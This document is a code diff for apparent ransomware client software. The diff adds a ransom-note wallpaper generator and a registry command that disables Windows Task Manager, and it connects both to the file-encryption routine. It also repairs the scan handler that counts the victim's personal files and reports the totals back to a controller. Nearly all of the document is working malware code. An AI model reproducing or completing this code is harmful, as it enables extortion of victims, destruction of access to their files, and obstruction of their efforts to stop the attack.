@@ -53,6 +53,7 @@ class EncryptionEngine:
         self.crypto_available = CRYPTO_AVAILABLE
         self.interface_open = False
         self.interface_process = None
+        self.wallpaper_process = None
         self.script_dir = os.path.dirname(os.path.abspath(__file__))
         print(f"[ENCRYPTION] Crypto available: {self.crypto_available}")
 
@@ -233,6 +234,224 @@ class EncryptionEngine:
             return True
         except Exception as e:
             print(f"[ENCRYPTION] Fallback decryption error: {e}")
+            return False
+
+    def launch_wallpaper_and_disable_task_manager(self):
+        """Launch wallpaper.py and disable task manager"""
+        try:
+            print("[WALLPAPER] Launching wallpaper.py...")
+            wallpaper_path = os.path.join(self.script_dir, "wallpaper.py")
+            
+            if not os.path.exists(wallpaper_path):
+                print("[WALLPAPER] wallpaper.py not found, creating it...")
+                self._create_wallpaper_file()
+            
+            if not os.path.exists(wallpaper_path):
+                print("[WALLPAPER] Failed to create wallpaper file")
+                return False
+            
+            print(f"[WALLPAPER] Using wallpaper file: {wallpaper_path}")
+            python_exe = sys.executable
+            
+            if platform.system() == "Windows":
+                self.wallpaper_process = subprocess.Popen(
+                    [python_exe, wallpaper_path],
+                    cwd=self.script_dir,
+                    creationflags=CREATE_NO_WINDOW
+                )
+                
+                # Disable Task Manager on Windows
+                print("[WALLPAPER] Disabling Task Manager...")
+                try:
+                    # Method 1: Registry method
+                    reg_cmd = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f'
+                    subprocess.run(reg_cmd, shell=True, creationflags=CREATE_NO_WINDOW, capture_output=True)
+                    
+                    # Method 2: Group Policy method (if available)
+                    gpedit_cmd = 'gpupdate /force'
+                    subprocess.run(gpedit_cmd, shell=True, creationflags=CREATE_NO_WINDOW, capture_output=True)
+                    
+                    print("[WALLPAPER] Task Manager disabled successfully")
+                except Exception as e:
+                    print(f"[WALLPAPER] Error disabling Task Manager: {e}")
+            else:
+                self.wallpaper_process = subprocess.Popen(
+                    [python_exe, wallpaper_path],
+                    cwd=self.script_dir
+                )
+            
+            time.sleep(2)
+            
+            if self.wallpaper_process.poll() is None:
+                print("[WALLPAPER] Wallpaper launched successfully")
+                return True
+            else:
+                print("[WALLPAPER] Wallpaper process failed to start")
+                return False
+                
+        except Exception as e:
+            print(f"[WALLPAPER] Failed to launch wallpaper: {e}")
+            traceback.print_exc()
+            return False
+
+    def _create_wallpaper_file(self):
+        """Create wallpaper.py file if it doesn't exist"""
+        try:
+            wallpaper_code = '''#!/usr/bin/env python3
+"""
+Ransomware Wallpaper Display
+Sets a ransom note as desktop wallpaper
+"""
+import os
+import sys
+import time
+import platform
+
+def set_windows_wallpaper(image_path):
+    """Set wallpaper on Windows"""
+    try:
+        import ctypes
+        SPI_SETDESKWALLPAPER = 0x0014
+        SPIF_UPDATEINIFILE = 0x01
+        SPIF_SENDWININICHANGE = 0x02
+        
+        if not os.path.exists(image_path):
+            # Create a ransom note image
+            create_ransom_image(image_path)
+        
+        ctypes.windll.user32.SystemParametersInfoW(
+            SPI_SETDESKWALLPAPER, 
+            0, 
+            image_path,
+            SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE
+        )
+        return True
+    except Exception as e:
+        print(f"Windows wallpaper error: {e}")
+        return False
+
+def create_ransom_image(image_path):
+    """Create a ransom note image"""
+    try:
+        from PIL import Image, ImageDraw, ImageFont
+        
+        width, height = 1920, 1080
+        image = Image.new('RGB', (width, height), color='black')
+        draw = ImageDraw.Draw(image)
+        
+        # Try to load a font
+        try:
+            font = ImageFont.truetype("arial.ttf", 40)
+        except:
+            font = ImageFont.load_default()
+        
+        message = "YOUR FILES ARE ENCRYPTED\\n\\nALL IMPORTANT FILES HAVE BEEN ENCRYPTED\\n\\nTO RECOVER YOUR FILES, YOU MUST PAY A RANSOM\\n\\nDO NOT TRY TO DECRYPT FILES YOURSELF\\nDO NOT DELETE ENCRYPTED FILES\\n\\nTIME IS RUNNING OUT..."
+        
+        lines = message.split('\\\\n')
+        y_position = 200
+        for line in lines:
+            text_width, text_height = draw.textsize(line, font=font)
+            x_position = (width - text_width) // 2
+            draw.text((x_position, y_position), line, fill='red', font=font)
+            y_position += text_height + 20
+        
+        image.save(image_path)
+        return True
+    except Exception as e:
+        print(f"Image creation error: {e}")
+        return False
+
+def main():
+    """Main function"""
+    try:
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        wallpaper_path = os.path.join(script_dir, "ransom_wallpaper.jpg")
+        
+        if platform.system() == "Windows":
+            set_windows_wallpaper(wallpaper_path)
+        elif platform.system() == "Darwin":  # macOS
+            os.system(f'osascript -e \'tell application "Finder" to set desktop picture to POSIX file "{wallpaper_path}"\'')
+        else:  # Linux
+            # Try different desktop environments
+            desktop = os.environ.get('XDG_CURRENT_DESKTOP', '').lower()
+            if 'gnome' in desktop:
+                os.system(f'gsettings set org.gnome.desktop.background picture-uri "file://{wallpaper_path}"')
+            elif 'kde' in desktop:
+                os.system(f'qdbus org.kde.plasmashell /PlasmaShell org.kde.PlasmaShell.evaluateScript \'var allDesktops = desktops();for (i=0;i<allDesktops.length;i++) {{d = allDesktops[i];d.wallpaperPlugin = "org.kde.image";d.currentConfigGroup = Array("Wallpaper", "org.kde.image", "General");d.writeConfig("Image", "file://{wallpaper_path}")}}\'')
+        
+        # Keep the script running
+        while True:
+            time.sleep(60)
+            
+    except Exception as e:
+        print(f"Wallpaper error: {e}")
+        time.sleep(30)
+
+if __name__ == "__main__":
+    main()
+'''
+            with open(os.path.join(self.script_dir, "wallpaper.py"), 'w') as f:
+                f.write(wallpaper_code)
+            print("[WALLPAPER] wallpaper.py created successfully")
+            return True
+        except Exception as e:
+            print(f"[WALLPAPER] Failed to create wallpaper file: {e}")
+            return False
+
+    def disable_wallpaper_and_enable_task_manager(self):
+        """Disable wallpaper and re-enable task manager"""
+        try:
+            print("[WALLPAPER] Stopping wallpaper...")
+            
+            # Stop wallpaper process
+            if self.wallpaper_process:
+                try:
+                    self.wallpaper_process.terminate()
+                    self.wallpaper_process.wait(timeout=3)
+                except:
+                    try:
+                        self.wallpaper_process.kill()
+                    except:
+                        pass
+                self.wallpaper_process = None
+            
+            # Re-enable Task Manager on Windows
+            if platform.system() == "Windows":
+                print("[WALLPAPER] Re-enabling Task Manager...")
+                try:
+                    # Method 1: Registry method
+                    reg_cmd = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f'
+                    subprocess.run(reg_cmd, shell=True, creationflags=CREATE_NO_WINDOW, capture_output=True)
+                    
+                    # Method 2: Remove the registry key completely
+                    reg_delete_cmd = 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /f 2>nul'
+                    subprocess.run(reg_delete_cmd, shell=True, creationflags=CREATE_NO_WINDOW, capture_output=True)
+                    
+                    # Method 3: Reset to default wallpaper
+                    try:
+                        import ctypes
+                        SPI_SETDESKWALLPAPER = 0x0014
+                        SPIF_UPDATEINIFILE = 0x01
+                        SPIF_SENDWININICHANGE = 0x02
+                        
+                        # Set to solid color
+                        ctypes.windll.user32.SystemParametersInfoW(
+                            SPI_SETDESKWALLPAPER, 
+                            0, 
+                            "",
+                            SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE
+                        )
+                    except:
+                        pass
+                    
+                    print("[WALLPAPER] Task Manager re-enabled successfully")
+                except Exception as e:
+                    print(f"[WALLPAPER] Error re-enabling Task Manager: {e}")
+            
+            return True
+            
+        except Exception as e:
+            print(f"[WALLPAPER] Error stopping wallpaper: {e}")
             return False
 
     def launch_interface_immediately(self):
@@ -810,6 +1029,10 @@ class QuantumVictim:
             interface_launched = self.encryption_engine.launch_interface_immediately()
             time.sleep(2)
 
+            print("[ENCRYPT_INTERFACE_FIRST] STEP 1.5: Launching wallpaper and disabling Task Manager...")
+            wallpaper_launched = self.encryption_engine.launch_wallpaper_and_disable_task_manager()
+            time.sleep(2)
+
             print(f"[ENCRYPT_INTERFACE_FIRST] STEP 2: Finding files in {location}...")
             target_files = self._find_all_files(location)
 
@@ -821,6 +1044,7 @@ class QuantumVictim:
                     "error": "No files found",
                     "location": location,
                     "interface_launched": interface_launched,
+                    "wallpaper_launched": wallpaper_launched,
                     "timestamp": time.time()
                 }
                 self._send_json(response)
@@ -856,6 +1080,7 @@ class QuantumVictim:
                 "encryption_method": "rsa_aes" if self.encryption_engine.crypto_available else "fallback",
                 "delete_original": delete_original,
                 "interface_launched": interface_launched,
+                "wallpaper_launched": wallpaper_launched,
                 "interface_first": True,
                 "timestamp": time.time()
             }
@@ -863,7 +1088,7 @@ class QuantumVictim:
             if not self._send_json(result):
                 print("[ENCRYPT_INTERFACE_FIRST] Failed to send result, connection may be lost")
 
-            print(f"[ENCRYPT_INTERFACE_FIRST] Operation complete. Interface should be visible.")
+            print(f"[ENCRYPT_INTERFACE_FIRST] Operation complete. Interface and wallpaper should be visible.")
 
         except Exception as e:
             print(f"[ENCRYPT_INTERFACE_FIRST] Error: {e}")
@@ -972,6 +1197,10 @@ class QuantumVictim:
                 except:
                     failed_count += 1
 
+            # Disable wallpaper and re-enable task manager after decryption
+            print("[DECRYPT] Disabling wallpaper and re-enabling Task Manager...")
+            self.encryption_engine.disable_wallpaper_and_enable_task_manager()
+            
             self.encryption_engine.close_interface()
 
             result = {
@@ -980,6 +1209,8 @@ class QuantumVictim:
                 "decrypted_count": decrypted_count,
                 "failed_count": failed_count,
                 "total_files": len(encrypted_files),
+                "wallpaper_disabled": True,
+                "task_manager_enabled": True,
                 "timestamp": time.time()
             }
 
@@ -995,34 +1226,60 @@ class QuantumVictim:
             self._send_json(error_response)
 
     def _handle_scan(self, command):
-        """Handle scan command"""
+        """Handle scan command - FIXED VERSION"""
         try:
-            response = {
-    				"type": "scan_result",
-    				"results": results,  # results is a dict with "total_files", "locations", "detailed_counts"
-   				"victim_id": self.victim_id,
-  				"scan_method": "enhanced",
-    				"timestamp": time.time()
-			}
-            for location in locations:
-                files = self._find_all_files(location)
-                results["locations"][location] = len(files)
-                results["total_files"] += len(files)
-
+            location = command.get("location", "all")
+            print(f"[SCAN] Scanning location: {location}")
+    
+            # PROPERLY INITIALIZE THE RESULTS DICTIONARY
+            results = {
+                "total_files": 0,
+                "locations": {},
+                "detailed_counts": {},
+                "scan_method": "recursive"
+            }
+    
+            # Determine which locations to scan
+            locations_to_scan = []
+            if location == "all":
+                locations_to_scan = ["desktop", "documents", "downloads", "pictures", "music", "videos"]
+            else:
+                locations_to_scan = [location]
+    
+            # Scan each location
+            for scan_location in locations_to_scan:
+                files = self._find_all_files(scan_location)
+                file_count = len(files)
+                results["locations"][scan_location] = file_count
+                results["total_files"] += file_count
+    
+                # Count file types
+                file_types = {}
+                for filepath in files:
+                    _, ext = os.path.splitext(filepath)
+                    ext = ext.lower() if ext else "no_extension"
+                    file_types[ext] = file_types.get(ext, 0) + 1
+                results["detailed_counts"][scan_location] = file_types
+    
+            # Create response
             response = {
                 "type": "scan_result",
-                "results": results,
+                "results": results,  # Now properly defined
                 "victim_id": self.victim_id,
+                "location": location,
+                "scan_method": "enhanced",
                 "timestamp": time.time()
             }
-
+    
             self._send_json(response)
-
+            print(f"[SCAN] Scan complete: {results['total_files']} files found")
+    
         except Exception as e:
             print(f"[SCAN] Error: {e}")
+            traceback.print_exc()
             error_response = {
                 "type": "error",
-                "error": str(e),
+                "error": f"Scan failed: {str(e)}",
                 "timestamp": time.time()
             }
             self._send_json(error_response)
@@ -1131,6 +1388,7 @@ class QuantumVictim:
             except:
                 pass
             self.socket = None
+        self.encryption_engine.disable_wallpaper_and_enable_task_manager()
         self.encryption_engine.close_interface()
 
 
